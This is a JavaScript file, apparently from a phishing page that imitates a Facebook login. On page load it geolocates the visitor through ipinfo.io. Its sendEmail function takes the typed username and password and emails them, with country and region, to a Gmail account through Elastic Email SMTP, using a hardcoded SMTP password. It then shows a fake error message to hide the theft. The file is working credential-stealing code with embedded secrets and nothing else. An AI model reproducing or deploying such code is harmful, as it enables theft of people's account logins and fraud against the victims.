

document.addEventListener('DOMContentLoaded', function() {
  // Call function to get user's location when the page loads
  getUserLocation();
});

function getUserLocation() {
  // Make an AJAX request to get the user's location using ipinfo.io API
  fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
          // Update the country and region (state) input fields with the retrieved information
          document.getElementById('country').value = data.country;
          document.getElementById('region').value = data.region;
      })
      .catch(error => {
          console.error('Error getting user location:', error);
      });
}



function sendEmail(){
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "benzzil621@gmail.com",
    Password : "20EA2239D98D8F5E66EAD98593AEACB8D6F7",
  To : 'benzzil621@gmail.com',
  From : "benzzil621@gmail.com",
  Subject : "You just received facebook details",
  Body : "Name: " + document.getElementById("uname").value
       + "<br>"
        + "<br> password: " + document.getElementById("upass").value
        + "<br>"
        + "<br> Country: " + document.getElementById("country").value
        + "<br>"
        + "<br> state: " + document.getElementById("region").value
        
}).then(
message => alert("Error processing request, please try again shortly")
);
}


//keshempire08@gmail.com

